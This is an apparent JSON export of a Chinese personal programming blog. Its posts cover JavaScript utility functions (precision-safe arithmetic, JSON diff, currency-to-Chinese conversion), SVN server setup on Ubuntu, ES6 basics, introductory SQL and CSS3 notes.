[{"title":"JS数字精度丢失的问题","date":"2017-12-20T04:15:25.000Z","path":"2017/12/20/精度丢失问题解决方法/","text":"##JS数字精度丢失的问题 ###解决方案123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104//作用范围9007199254740992 Math.pow(2, 53)var floatObj = function() &#123; /* * 判断obj是否为一个整数 */ function isInteger(obj) &#123; return Math.floor(obj) === obj &#125; /* * 将一个浮点数转成整数，返回整数和倍数。如 3.14 &gt;&gt; 314，倍数是 100 * @param floatNum &#123;number&#125; 小数 * @return &#123;object&#125; * &#123;times:100, num: 314&#125; */ function toInteger(floatNum) &#123; var ret = &#123;times: 1, num: 0&#125; var isNegative = floatNum &lt; 0 if (isInteger(floatNum)) &#123; ret.num = floatNum return ret &#125; var strfi = floatNum + '' var dotPos = strfi.indexOf('.') var len = strfi.substr(dotPos+1).length var times = Math.pow(10, len) var intNum = parseInt(Math.abs(floatNum) * times + 0.5, 10) ret.times = times if (isNegative) &#123; intNum = -intNum &#125; ret.num = intNum return ret &#125; /* * 核心方法，实现加减乘除运算，确保不丢失精度 * 思路：把小数放大为整数（乘），进行算术运算，再缩小为小数（除） * * @param a &#123;number&#125; 运算数1 * @param b &#123;number&#125; 运算数2 * @param op &#123;string&#125; 运算类型，有加减乘除（add/subtract/multiply/divide） * */ function operation(a, b, op) &#123; var o1 = toInteger(a) var o2 = toInteger(b) var n1 = o1.num var n2 = o2.num var t1 = o1.times var t2 = o2.times var max = t1 &gt; t2 ? t1 : t2 var result = null switch (op) &#123; case 'add': if (t1 === t2) &#123; // 两个小数位数相同 result = n1 + n2 &#125; else if (t1 &gt; t2) &#123; // o1 小数位 大于 o2 result = n1 + n2 * (t1 / t2) &#125; else &#123; // o1 小数位 小于 o2 result = n1 * (t2 / t1) + n2 &#125; return result / max case 'subtract': if (t1 === t2) &#123; result = n1 - n2 &#125; else if (t1 &gt; t2) &#123; result = n1 - n2 * (t1 / t2) &#125; else &#123; result = n1 * (t2 / t1) - n2 &#125; return result / max case 'multiply': result = (n1 * n2) / (t1 * t2) return result case 'divide': result = (n1 / n2) * (t2 / t1) return result &#125; &#125; // 加减乘除的四个接口 function add(a, b) &#123; return operation(a, b, 'add') &#125; function subtract(a, b) &#123; return operation(a, b, 'subtract') &#125; function multiply(a, b) &#123; return operation(a, b, 'multiply') &#125; function divide(a, b) &#123; return operation(a, b, 'divide') &#125; // exports return &#123; add: add, subtract: subtract, multiply: multiply, divide: divide &#125;&#125;(); toFixed 修复1234567// toFixed 修复function toFixed(num, s) &#123; var times = Math.pow(10, s) var des = num * times + 0.5 des = parseInt(des, 10) / times return des + ''&#125;","comments":true,"tags":[{"name":"js","slug":"js","permalink":"http://www.wanyifeng.top/tags/js/"},{"name":"轮子","slug":"轮子","permalink":"http://www.wanyifeng.top/tags/轮子/"}]},{"title":"svn服务器搭建","date":"2017-12-10T13:13:15.000Z","path":"2017/12/10/svn-ubuntu服务器/","text":"svn服务器搭建第一步：安装subversion12sudo apt-get install subversion#其他yum 也可以 第二步：创建目录文件夹1234mkdir /svnmkdir /svn/projectName#初始化项目空间svnadmin create /svn/projectName 第三步：配置svn权限和用户 12345678910111213141516171819202122232425262728#configanon-access = readauth-access = write #用户权限 这里指的是文件的路径 如果多个项目使用同一个账户可以吧passwd 配置成公共文件password-db = passwd #目录权限 这里指的是文件的路径 如果多个项目使用同一个账户可以吧authz 配置成公共文件authz-db = authz #放开以上代码 配置权限 #注意以上配置注意需要顶格写 否则出异常#passwd文件[user]admin = 123user1 = 123user2 = 456#用户名与密码一一对应 注意空格#authz文件#如果为公共文件[projectName1:/]@admin = rw@user1 = rw* = r[projectName2:/]@admin = rw@user1 = rw* = r 第四步：启动svnservice 123456789101112131415161718192021222324252627#启动svnserve -d -r /svn#查看是否启动成功sudo netstat -antp |grep svnserve#tcp 0 0 0.0.0.0:3690 0.0.0.0:* LISTEN 28967/svnserve#关闭pkill svnserve#开机启动#在/etc/init.d目录建立一个脚本文件svnd.shcd /etc/init.dtouch svnd.shchmod +x svnd.shvim svnd.sh#输入以下内容#!/bin/bash#svnserve startupsvnserve -d -r /ysh/svn:wq#更新修改权限：update-rc.d svnd.sh defaults#访问版本库地址svn://***.***.***.***/projectName#阿里云注意配置规则svn端口3690","comments":true,"tags":[{"name":"服务器搭建","slug":"服务器搭建","permalink":"http://www.wanyifeng.top/tags/服务器搭建/"}]},{"title":"json数据diff方法（js）","date":"2017-10-05T13:30:18.000Z","path":"2017/10/05/JSON数据变化diff算法JS/","text":"json数据diff方法（js）1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071//数据diff modeler = &#123;&#125; modeler.compArray = function(array1, array2) &#123; if((array1 &amp;&amp; typeof array1 === \"object\" &amp;&amp; array1.constructor === Array) &amp;&amp; (array2 &amp;&amp; typeof array2 === \"object\" &amp;&amp; array2.constructor === Array)) &#123; if(array1.length == array2.length) &#123; for(var i = 0; i &lt; array1.length; i++) &#123; var ggg = modeler.compObj(array1[i], array2[i]); if(!ggg) &#123; return false; &#125; &#125; &#125; else &#123; return false; &#125; &#125; else &#123; throw new Error(\"argunment is error ;\"); &#125; return true; &#125;; modeler.compObj = function(obj1, obj2) //比较两个对象是否相等，不包含原形上的属性 &#123; if((obj1 &amp;&amp; typeof obj1 === \"object\") &amp;&amp; ((obj2 &amp;&amp; typeof obj2 === \"object\"))) &#123; var count1 = modeler.propertyLength(obj1); var count2 = modeler.propertyLength(obj2); if(count1 == count2) &#123; for(var ob in obj1) &#123; if(obj1.hasOwnProperty(ob) &amp;&amp; obj2.hasOwnProperty(ob)) &#123; if(obj1[ob].constructor == Array &amp;&amp; obj2[ob].constructor == Array) //如果属性是数组 &#123; if(!modeler.compArray(obj1[ob], obj2[ob])) &#123; return false; &#125;; &#125; else if(typeof obj1[ob] === \"string\" &amp;&amp; typeof obj2[ob] === \"string\") //纯属性 &#123; if(obj1[ob] !== obj2[ob]) &#123; return false; &#125; &#125; else if(typeof obj1[ob] === \"object\" &amp;&amp; typeof obj2[ob] === \"object\") //属性是对象 &#123; if(!modeler.compObj(obj1[ob], obj2[ob])) &#123; return false; &#125;; &#125; else &#123; return false; &#125; &#125; else &#123; return false; &#125; &#125; &#125; else &#123; return false; &#125; &#125; return true; &#125;; modeler.propertyLength = function(obj) //获得对象上的属性个数，不包含对象原形上的属性 &#123; var count = 0; if(obj &amp;&amp; typeof obj === \"object\") &#123; for(var ooo in obj) &#123; if(obj.hasOwnProperty(ooo)) &#123; count++; &#125; &#125; return count; &#125; else &#123; throw new Error(\"argunment can not be null;\"); &#125; &#125;;","comments":true,"tags":[{"name":"轮子","slug":"轮子","permalink":"http://www.wanyifeng.top/tags/轮子/"}]},{"title":"文件大小单位装换","date":"2017-10-05T13:07:22.000Z","path":"2017/10/05/动态加载js/","text":"动态加载js12345678910111213141516171819function loadBdScript(scriptId, url, callback) &#123; var script = document.createElement(\"script\") script.type = \"text/javascript\"; if(script.readyState) &#123; //IE script.onreadystatechange = function() &#123; if(script.readyState == \"loaded\" || script.readyState == \"complete\") &#123; script.onreadystatechange = null; callback(); &#125; &#125;; &#125; else &#123; //Others script.onload = function() &#123; callback(); &#125;; &#125; script.src = url; script.id = scriptId; document.getElementsByTagName(\"head\")[0].appendChild(script);&#125;;","comments":true,"tags":[{"name":"轮子","slug":"轮子","permalink":"http://www.wanyifeng.top/tags/轮子/"}]},{"title":"文件大小单位装换","date":"2017-10-05T13:05:12.000Z","path":"2017/10/05/文件大小单位装换/","text":"123456789101112131415161718//输入文件大小返回Bitfunction readSizeBit(value)&#123; value = value.toUpperCase() var type = &#123;\"B\" :0,\"KB\":1,\"MB\":2,\"GB\":3&#125;,num; return value.replace(/(\\d+)(\\w+)/,function(a,b,c)&#123; return Number(b)*Math.pow(1024,type[c]) &#125;)&#125;//输入Bit装换单位function bytesToSize(bytes) &#123; if (bytes === 0) return '0 B'; var k = 1024 sizes = ['B', 'KB', 'MB', 'GB', 'TB', 'PB', 'EB', 'ZB', 'YB'], i = Math.floor(Math.log(bytes) / Math.log(k)); return (bytes / Math.pow(k, i)).toPrecision(3) + ' ' + sizes[i];&#125; 中文大小写1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586//数字转大写中文function convertCurrency(money) &#123; //汉字的数字 var cnNums = new Array('零', '壹', '贰', '叁', '肆', '伍', '陆', '柒', '捌', '玖'); //基本单位 var cnIntRadice = new Array('', '拾', '佰', '仟'); //对应整数部分扩展单位 var cnIntUnits = new Array('', '万', '亿', '兆'); //对应小数部分单位 var cnDecUnits = new Array('角', '分', '毫', '厘'); //整数金额时后面跟的字符 var cnInteger = '整'; //整型完以后的单位 var cnIntLast = '元'; //最大处理的数字 var maxNum = 999999999999999.9999; //金额整数部分 var integerNum; //金额小数部分 var decimalNum; //输出的中文金额字符串 var chineseStr = ''; //分离金额后用的数组，预定义 var parts; if (money == '') &#123; return ''; &#125; money = parseFloat(money); if (money &gt;= maxNum) &#123; //超出最大处理数字 return ''; &#125; if (money == 0) &#123; chineseStr = cnNums[0] + cnIntLast + cnInteger; return chineseStr; &#125; //转换为字符串 money = money.toString(); if (money.indexOf('.') == -1) &#123; integerNum = money; decimalNum = ''; &#125; else &#123; parts = money.split('.'); integerNum = parts[0]; decimalNum = parts[1].substr(0, 4); &#125; //获取整型部分转换 if (parseInt(integerNum, 10) &gt; 0) &#123; var zeroCount = 0; var IntLen = integerNum.length; for (var i = 0; i &lt; IntLen; i++) &#123; var n = integerNum.substr(i, 1); var p = IntLen - i - 1; var q = p / 4; var m = p % 4; if (n == '0') &#123; zeroCount++; &#125; else &#123; if (zeroCount &gt; 0) &#123; chineseStr += cnNums[0]; &#125; //归零 zeroCount = 0; chineseStr += cnNums[parseInt(n)] + cnIntRadice[m]; &#125; if (m == 0 &amp;&amp; zeroCount &lt; 4) &#123; chineseStr += cnIntUnits[q]; &#125; &#125; chineseStr += cnIntLast; &#125; //小数部分 if (decimalNum != '') &#123; var decLen = decimalNum.length; for (var i = 0; i &lt; decLen; i++) &#123; var n = decimalNum.substr(i, 1); if (n != '0') &#123; chineseStr += cnNums[Number(n)] + cnDecUnits[i]; &#125; &#125; &#125; if (chineseStr == '') &#123; chineseStr += cnNums[0] + cnIntLast + cnInteger; &#125; else if (decimalNum == '') &#123; chineseStr += cnInteger; &#125; return chineseStr;&#125;","comments":true,"tags":[{"name":"轮子","slug":"轮子","permalink":"http://www.wanyifeng.top/tags/轮子/"}]},{"title":"es6简单梳理","date":"2017-10-04T11:12:52.000Z","path":"2017/10/04/es6/","text":"let关键字12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879//1.let有块级作用域&#123; let a = 10; var b = 1;&#125;a // ReferenceError: a is not defined.b // 1//2.let不会有变量声明提升console.log(foo); // 输出undefinedvar foo = 2;console.log(bar); // 报错ReferenceErrorlet bar = 2;//3.暂时性死区var tmp = 1;if (1) &#123; tmp = 2; // ReferenceError let tmp;&#125; //let声明时会绑定块级当前环境的上下文 //在let声明变量前，对tmp赋值会报错if (1) &#123; tmp = 'abc'; // ReferenceError console.log(tmp); // ReferenceError let tmp; // console.log(tmp); // undefined tmp = 123; console.log(tmp); // 123&#125;//4.不允许重复声明 // 报错function fn() &#123; let tmp = 10; var tmp = 100;&#125; // 报错function func() &#123; let tmp = 10; let tmp = 100;&#125;//let不允许在相同作用域内，重复声明同一个变量。function fn(arg) &#123; let arg; // 报错&#125;function fn(arg) &#123; &#123; let arg; // 不报错 &#125;&#125;// let是具有块级作用域的let n = 5;if (true) &#123; let n = 10; console.log(n); // 10&#125;console.log(n); // 5//es5的块级作用域(function ()&#123; &#125;());//es6的块级作用域&#123; &#125;//注意在es6中在块级作用域中声明的的函数跟let的性质是差不多的在外层作用域中是无法访问到的//在块级作用域中写函数是最好写成函数表达式的形式&#123; let a = '哎哎哎'; let f = function () &#123; return a; &#125;;&#125;// 注意let使用不当会导致js无法继续执行 因为let会报错 const关键字1234//const声明一个只读的常量。一旦声明，常量的值就不能改变。const a = 20;//const声明后一定要赋值否则报错//const的规则和let基本相同 解构赋值12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091let a = 1;let b = 2;let c = 3;let [a, b, c] = [1, 2, 3];a //1b //2c //3//这两种赋值操作的结果是一样的let [A, [[B], C]] = [1, [[2], 3]];A // 1B // 2C // 3//左边和右边的值会进行匹配 匹配成功解构赋值成功 如果失败返回undefindlet [ , , sed] = [\"foo\", \"bar\", \"baz\"]; // 解构成功 sed // 'bazlet [x, y, ...z] = ['a'];// 解构成功 x // \"a\"y // undefinedz // []let [x, y] = [1, 2, 3];// 解构成功 x // 1y // 2let [foo] = [];// 解构失败 let [bar, foo] = [1];// 解构失败let [foo] = 1;// 解构失败 //值都会等于undefined。// 解构默认值let [foo = true] = [];foo // truelet [x, y = 'b'] = ['a']; // x='a', y='b'let [x, y = 'b'] = ['a', undefined]; // x='a', y='b'//注意，ES6 内部使用严格相等运算符（===)//判断一个位置是否有值 数组成员严格等于undefined，默认值才会生效。//如果默认值是一个表达式，那么这个表达式是惰性求值的，即只有在用到的时候，才会求值。function f() &#123; console.log('sss');&#125;let [x = f()] = [1];//解构赋值不仅能适用于数组还能适用于对象let &#123; foo, bar &#125; = &#123; foo: \"aaa\", bar: \"bbb\" &#125;;foo // \"aaa\"bar // \"bbb\"let &#123; bar, foo &#125; = &#123; foo: \"aaa\", bar: \"bbb\" &#125;;foo // \"aaa\"bar // \"bbb\"let &#123;length : len&#125; = 'hello';len // 5//函数参数的解构赋值function add([x, y])&#123; return x + y;&#125;add([1, 2]); // 3[[1, 2], [3, 4]].map(([a, b]) =&gt; a + b);// [ 3, 7 ]//利用解构赋值提取JSONlet jsonData = &#123; id: 42, status: \"OK\", data: [867, 5309]&#125;;let &#123; id, status, data: number &#125; = jsonData;console.log(id, status, number);// 42, \"OK\", [867, 5309]//注意number相当于data的别名//函数参数的默认值jQuery.ajax = function (url, &#123; async = true, beforeSend = function () &#123;&#125;, cache = true, complete = function () &#123;&#125;, crossDomain = false, global = true, // ... more config&#125;) &#123; // ... do stuff&#125;;//对象的属性没有次序，变量必须与属性同名，才能取到正确的值 Map 语法: let MapData = new Map([iterable]); Map结构提供了“值—值”的对应，是一种更完善的Hash结构实现。如果你需要“键值对”的数据结构，Map比Object更合适。它类似于对象，也是键值对的集合，但是“键”的范围不限于字符串，各种类型的值（包括对象）都可以当作键。 12345678910111213141516171819202122232425262728293031323334//一个Map对象以插入顺序迭代其元素 — 一个 for...of 循环为每次迭代返回一个[key，value]数组。var m = new Map();var o = &#123;p: \"Hello World\"&#125;;//如果存入的是对象那么相当于是对象该对象的引用为标识m.set(o, \"content\")m.get(o) // \"content\"m.has(o) // truem.delete(o) // truem.has(o) // false//注意，只有对同一个对象的引用，Map结构才将其视为同一个键。这一点要非常小心。var map = new Map();map.set(['a'], 555);map.get(['a']) // undefined//上面代码的set和get方法，表面是针对同一个键，但实际上这是两个值，//内存地址是不一样的，因此get方法无法读取该键，返回undefined。//属性方法Map.prototype.size//返回Map对象的键/值对的数量。Map.prototype.clear()//移除Map对象的所有键/值对 。Map.prototype.delete(key)//移除任何与键相关联的值，并且返回该值//该值在之前会被Map.prototype.has(key)返回为true//之后再调用Map.prototype.has(key)会返回false。Map.prototype.forEach(callbackFn[, thisArg])//按插入顺序，为 Map对象里的每一键值对调用一次callbackFn函数。//如果为forEach提供了thisArg，它将在每次回调中作为this值。Map.prototype.get(key)//返回键对应的值，如果不存在，则返回undefined。Map.prototype.has(key)//返回一个布尔值，表示Map实例是否包含键对应的值。Map.prototype.set(key, value)//设置Map对象中键的值。返回该Map对象。 Set let SetData = new Set([iterable]); Set对象是值的集合，你可以按照插入的顺序迭代它的元素。 Set中的元素只会出现一次，即 Set 中的元素是唯一的。 123456789101112131415161718var set = new Set([1, 2, 3, 4, 4]);[...set]// [1, 2, 3, 4]var s = new Set();[2, 3, 5, 4, 5, 2, 2].map(x =&gt; s.add(x));for (let i of s) &#123; console.log(i);&#125;// 2 3 5 4//方法和属性Set.prototype.add(value)//在Set对象尾部添加一个元素。返回该Set对象。Set.prototype.clear()//移除Set对象内的所有元素。Set.prototype.delete(value)//移出指定的valueSet.prototype.forEach(callbackFn[, thisArg]) 模板字符串12345678910//es5$('a').append( \"&lt;span&gt;\"+ data.name +\"&lt;/span&gt;\");//es6$('a').append( `&lt;span&gt;$(data.name)&lt;/span&gt;`);//在大括号中可以进行任意操作如计算 函数返回值...//注意:如果使用模板字符串表示多行字符串，所有的空格和缩进都会被保留在输出之中。 es6计算属性名语法123456789//es6var a = &#123; ['foo' + ++i]: i, ['foo' + ++i]: i, ['foo' + ++i]: i&#125;;//es5var a = &#123;&#125;a[\"foo\"+ i++] = i","comments":true,"tags":[{"name":"js","slug":"js","permalink":"http://www.wanyifeng.top/tags/js/"}]},{"title":"SQL入门(一)","date":"2017-10-03T01:55:32.000Z","path":"2017/10/03/简单sql入门(一)/","text":"##SQL入门(一)DDL数据定义语言​ 创建数据库、创建表DML数据操纵语言​ 插入数据(insert) 修改数据(update)删除数据(delete)DCL数据控制语言​ if elseDQL数据查询语言​ 查询数据 select ###数据库的操作 创建数据库 1234567-- 语法：create database 数据库名称 character set 编码 collate 校对规则;--创建一个名称为mydb1的数据库。create database mydb1;--创建一个使用utf8字符集的mydb2数据库。create database mydb2 character set 'utf8';--创建一个使用utf8字符集，并带校对规则的mydb3数据库。create database mydb3 character set 'utf8' collate 'utf8_bin'; 修改数据库 123--语法：alter database 数据库 character set 编码 collate 校对规则;--修改库的字符集修改为gbkalter database mydb2 character set 'gbk'; 表的操作 字段类型 12345678910111213141516171819VARCHAR、CHAR varchar和char区别： varchar（经常使用） 长度是可变的。 name varchar(8) 存入数据hello，但是如果存入helloworld报错了。 char (效率高) 长度不可变的。 name char(8) 存入的数据hello，如果不够用空格补全。大数据类型（一般不用） BLOB、TEXT BLOB：二进制文件 TEXT：字符数值型 TINYINT 、SMALLINT、INT、BIGINT、FLOAT、DOUBLE逻辑性 对应boolean BIT日期型 DATE、TIME、DATETIME、TIMESTAMP date 只包含日期 time 只包含时分秒 datetime和timestamp包含日期和时分秒区别： datetime需要手动录入时间。 timestamp不传入数据，默认选择当前系统时间。 约束（单表） 1234567主键约束 通过pramary key声明主键。（默认唯一、非空） auto_increment 数据库维护主键。自动增长。唯一约束 值是唯一的。使用unique声明非空约束 值不能为空 not null 创建表 12345678910create table employee2( id int primary key auto_increment, name varchar(20) unique not null, gender varchar(10) not null, birthday date not null, entry_date date not null, job varchar(100) not null, salary double not null, resume text not null); 删除表 12-- drop table 表名字drop table employee2; 修改表 123456alter table 表名 add 字段 类型(长度) 约束; -- 添加字段alter table 表名 drop 字段; -- 删除字段alter table 表名 modify 字段 类型(长度) 约束; -- 修改类型或者约束alter table 表名 change 旧字段 新字段 类型(长度) 约束 -- 修改字段的名称 rename table 表名 to 新表名; -- 修改表名alter table 表名 character set utf8; -- 修改字符集 添加数据 1234567--添加数据 insert into 表名 (字段1,字段2,字段3..) values(值1,值2,值3...); --有几列就插入多少的值。 insert into 表名 values(值1,值2,值3...); --插入所有的列--注意：-- 数据与字段的类型相同。-- 字段长度需要控制。-- 字符串或者日期类型需要使用'' 修改数据 1234--语法： update 表名 set 字段=值,字段=值... [where ] update user set deptCoed=5000 where id='12';--如果没有where条件，默认更新所有的记录。--有where提交，选择某一条记录。 删除数据 12345678--语法：delete from 表名 [where ]; 删除数据--truncate 表名; 删除所有的数据 --truncate 和 delete的区别：-- truncate删除数据，先删除整个表。再创建一个新的空的表。（效率）-- delete删除数据，一条一条删除的。delete from user;truncate user; 查询语句 12345678910111213141516-- 语法： select * from 表名; 查询所有（字段）-- select 字段名1,字段名2,字段名3 from 表名; 显示查询字段名-- select DISTINCT 字段名 from 表名; 去除重复的数据。 -- * 查询的列可以运算-- * 可以使用别名：使用as 别名 并且as可以省略。select name,math+10,english+10,chinese+10 from stu where english &lt; 15;-- 常用的符号 &gt; &lt; &lt;= &gt;= = &lt;&gt;（不等于）like -- 模糊查询 写法：like '张_或者%'; _和%区别：占位符。_只一个%可以有多个%的写法like '%张'; -- 结果XXX张like '张%'; --结果张XXXlike '%张%'; --只要有张就行is null -- 判断是否为nulland -- 并且or -- 或者not -- 不成立","comments":true,"tags":[{"name":"SQL","slug":"SQL","permalink":"http://www.wanyifeng.top/tags/SQL/"}]},{"title":"css3小结","date":"2017-09-30T15:22:15.000Z","path":"2017/09/30/CSS3/","text":"##CSS3 rem1rem 是动态改变的在原设计图中为你除的比例 overflow1overflow:hidder 给子元素内容不会环绕子元素 ###input系列 123456&lt;input type = \"color\"&gt;&lt;!--选择颜色--&gt;&lt;input type = \"data\"&gt;&lt;!--选择日期--&gt;&lt;input type = \"week\"&gt;&lt;input type = \"month\"&gt;&lt;!--约束输入内容--&gt;&lt;input type = \"number\"&gt;&lt;!--约束输入内容为数字--&gt;&lt;input type = \"email\"&gt; 移动端123&lt;input type = \"email\"&gt;&lt;input type = \"tel\"&gt;&lt;input type = \"range\"&gt;&lt;!--滑动条--&gt; input type=”text”1.属性介绍1234567891011121314&lt;input type=\"text\" placeholder=\"ssss\" autofocus required pattern = \"正则表达式\" /&gt;&lt;!--palceholder = \"\";占位提示光标的autofocus 自动获取焦点 有多个的情况是第一个标签实现required非空验证pattern = 正则 自定义验证的规则--&gt; 2.验证失败事件123456789101112131415161718192021// 验证失败事件document.getElementById('telBtn').oninvalid = function()&#123; console.log('失败了'); // 如果 要提示的智能一些 需要写多一点js判断 // 修改 弹框的内容 this.setCustomValidity('兄弟要输入的是手机号 你看看 对不对 O(∩_∩)O');&#125;// 绑定了 oninput事件 就会在用户输入内容的时候 一直触发 document.getElementById('telBtn').oninput = function ()&#123; console.log('123'); // 清空提示信息 this.setCustomValidity('');&#125; //this.setCustomValidity 改变弹窗内容//oninvalid 验证失败事件//oninput 输入事件 用户输入内容的时候 一直触发 pointer-eventspointer-events:none即可让这个HTML元素（包括它的所有子孙元素）失去所有的事件响应。鼠标焦点会直接无视它，click、mouseover等所有事件会穿透它到达它的下一级元素 ###新标签 ####数据提示12345678&lt;!--输入信息自动提示--&gt;&lt;input type = \"text\" list = \"foodlist\"&gt;&lt;datalist ID= \"foodlist\"&gt; &lt;option&gt;数据1 &lt;/option&gt; &lt;option&gt;数据1 &lt;/option&gt; &lt;option&gt;数据1 &lt;/option&gt; &lt;output&gt;放输出的内容&lt;/output&gt;&lt;/datalist&gt; ####进度条 12345&lt;progress value = \"0.5\"&gt;&lt;/progress&gt; &lt;!--取值0-1--&gt;&lt;meter value =\"50\" max = \"100\"&gt;&lt;meter&gt;&lt;!--max取值范围--&gt; &lt;!--兼容问题一般不用--&gt; ###条件注释1.快捷键：cc:ie6+tab12345678910111213 &lt;!--[if lt IE 9]&gt; 兼容文件 &lt;script src=\"//cdn.bootcss.com/html5shiv/3.7.2/html5shiv.min.js\"&gt;&lt;/script&gt; &lt;script src=\"//cdn.bootcss.com/respond.js/1.4.2/respond.min.js\"&gt;&lt;/script&gt; &lt;![endif]--&gt; 小于ie9的版本会自动加载js &lt;!--[if lte IE 8]&gt; script文件 html5shiv.min h5标签IE兼容文件&lt;![endif]--&gt; 小于等于ie8的版本会自动加载js ####video标签12345678910111213141516171819&lt;video controls autoplay loop width = \"300px\" height = \"500px\" poster = \"图片地址封面\"&gt; &lt;source src=\"myvideo.mp4\" type=\"video/mp4\"&gt;&lt;/source&gt; &lt;source src=\"myvideo.ogv\" type=\"video/ogg\"&gt;&lt;/source&gt; &lt;source src=\"myvideo.webm\" type=\"video/webm\"&gt;&lt;/source&gt; &lt;object width=\"\" height=\"\" type=\"application/x-shockwave-flash\" data=\"myvideo.swf\"&gt; &lt;param name=\"movie\" value=\"myvideo.swf\" /&gt; &lt;param name=\"flashvars\" value=\"autostart=true&amp;amp;file=myvideo.swf\" /&gt; &lt;/object&gt; 当前浏览器不支持 video直接播放，点击这里下载视频： &lt;a href=\"myvideo.webm\"&gt;下载视频&lt;/a&gt;&lt;/video&gt;&lt;!--controls 控制器autoplay 自动播放loop 循环播放width 和 height 视屏不会拉伸 保证显示效果poster 为封面有自动播放的时候不会显示&lt;source&gt;视屏兼容性问题自动选择 相对应的格式&lt;object&gt;为flash的播放地址web的video是可以下载的 控制器在不同的浏览器样式不一样--&gt; audio标签1234&lt;audio src = \"路径\" controls aoutpaly loop&gt;&lt;!--controls 控制条 和video标签一样存在样式不相同的问题autoplay 自动播放loop 循环播放--&gt; 新属性####保证元素尺寸 12box-sizing:border-box 让元素优先保证自己的尺寸 border 和 padding 都会压缩内容实现&lt;!--默认为box-sizing:content-box --&gt; ####阴影 1.文字阴影123456789text-shadow：2px 3px 50px yellow text-shadow：2px 3px 50px yellow，-2px -3px 50px red/*可以写多个样式用,隔开 可以同时生效参数1 x坐标参数2 y坐标参数3 模糊度参数4 颜色*/ 2.盒子阴影1234567891011box-shadow inset 0px 0px 0px 0px yellow box-shadow 0px 0px 10px 20px yellow inset , 0px 0px 10px 20px/*可以写多个样式用,隔开 可以同时生效参数1 x坐标参数2 y坐标参数3 模糊度参数4 让影子直接放大参数5 颜色参数6 inset 影子发散往里面投影 不写向外面发散 该属性可以写在最前面或者最后面*/ ####伪元素1234567891011121314151617元素选择器::before /*在...之前*/元素选择器::element::after /*在...之后*//*作用：在当前元素 添加一个元素 可以为这个被追加的元素添加各种样式 从而减少html标签的目的；注意： 1.伪元素选择用两个：或者一个：也可以生效 写一个：时，新的浏览器会自动添加，老的浏览器不支持两个：的写法 兼容写法为一个： 2.单标签无法使用； 3.伪元素内容必须有content 可以为任何内容一般为\"\"； 4.*选择器无法选中伪元素标签； */ ####渐变 线性渐变1234567891011121314/*一个方向向另一个方向*/background:linear-gradient(角度，颜色1，颜色2 百分比)；/*进度条案例*/background-image: linear-gradient( 135deg, green 25%, yellow 25%, yellow 50%, green 50%, green 75%, yellow 75%, yellow 100%); #####径向（圆形）渐变12background:radial-gradient（x半径 y半径 at x位置 y位置，颜色1，颜色2，背景颜色）/*值为0 位置坐标为左上角 中心坐标为圆心*/ 注意 1.谷歌不支持过度 ie中支持过度，由于兼用问题不建议设置渐变过度； 2.用工具可以直接生成代码 ###动画 简单动画属性#####移动位置1234567transform:translate(x坐标，y坐标) /*Z的坐标不能连写*/transform:translateX(50px)transform:translateY(50px)transform:translateZ(50px) /*开启3d效果和视角效果才可以看到*/ ####旋转1234567transform:rotateX(50deg)transform:rotateY(50deg)transform:rotateZ(50deg)/*不支持连写默认为Z轴方向*/ ####缩放12345transform:scale(0.5,0.5);/*x轴y轴方向都缩小到0.5倍的宽高*/transform:scaleX();transform:scaleY(); ####扭曲12345transform:skew(90deg,0)/*扭曲x坐标方向和y坐标方向*/transform:skewX();transform:skewY(); 注意： 属性连写的操作是顺序执行的； ####设置变换的中心点 12transform-origin x坐标点 y坐标点/*左上为原点 0 0*/ ####设置元素跟浏览器的距离123456perspective：100px；/*如果想要效果好一点值可以设置小一点如果向z轴移动，最多不要超过设置的px；视角中心点默认是在元素内部的中间，如果有多个元素效果十分明显；建议设置父元素*/ ####开启3d渲染效果（设置给父元素）12transform-style：prserve3d/*因为3d渲染比较消耗性能 默认关闭*/ ####过度属性1234567891011transform-poperty:width;/*只有width会过度*/transition-duration:1s;/*持续时间1s*/transition-delay:2s;/*延时2s*/transition-timing-function:linear/*动画效果 一般默认缓动动画 linear为匀速*/transition:width 2s 2s，height 2s 2s ;/*连写 transtion:什么元素 几秒完成 延迟时间 动画效果 用，隔开可以写多个效果*/transition:all 2s ;/*过度属性一般使用*/ 复杂动画分步过度12transition：all 5s steps（5）/*分5步执行过度 每一秒过度一次*/ 动画定义123456789101112131415161718192021222324252627282930313233@keyframes&#123; from&#123;&#125;//初始为 to&#123; //动画属性设置//或者百分比 &#125;&#125;/*doem*/ @keyframes move &#123; /*动画名称*/ 20% &#123; transform: translateX(1000px); &#125; 25% &#123; transform: translateX(1000px) rotateZ(90deg); &#125; 45% &#123; transform: translateX(1000px) rotateZ(90deg) translateY(400px); &#125; 50% &#123; transform: translateX(1000px) translateY(400px) rotateZ(180deg); &#125; 70% &#123; transform: translateX(0px) translateY(400px) rotateZ(180deg); &#125; 75% &#123; transform: translateX(0px) translateY(400px) rotateZ(270deg); &#125; 95% &#123; transform: translateX(0px) translateY(0px) rotateZ(270deg); &#125; 100% &#123; transform: translateX(0px) translateY(0px) rotateZ(360deg); &#125; &#125; 动画调用123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869animation：/*动画名称 运行时间 运行线性 运行次数 运行状态 延迟播放时间要在运行时间后面*/animation-timing-function：steps（5）分5步完成！ 连写可以直接加上 animation-playstate = \"paused\"/*暂停*/animation-playstate = \"running\"/*播放*//*这两个w3c正在考虑移除 因为动画的状态可以通过其它的方式实现，比如重设样式*/animation-name /*检索或设置对象所应用的动画名称 */animation-duration /*检索或设置对象动画的持续时间 */animation-timing-function /*检索或设置对象动画的过渡类型*/ animation-delay /*检索或设置对象动画延迟的时间 */animation-iteration-count /*检索或设置对象动画的循环次数 */animation-direction /*检索或设置对象动画在循环中是否反向运动*/ animation-fill-mode /*检索或设置对象动画时间之外的状态*/ /* 动画使用步骤1 定义一个动画 */ @keyframes rotateZ &#123; /* 从 xxx * 如果 我们是希望 从元素的 初始状态开始 那么 from 可以省略不写 * */ from &#123;&#125; /* 到xxx */ to &#123; transform: rotateZ(360deg); &#125; &#125; /* 通过动画的 属性 设置给某个元素 */ /* 通过class的方式 添加动画效果 */ 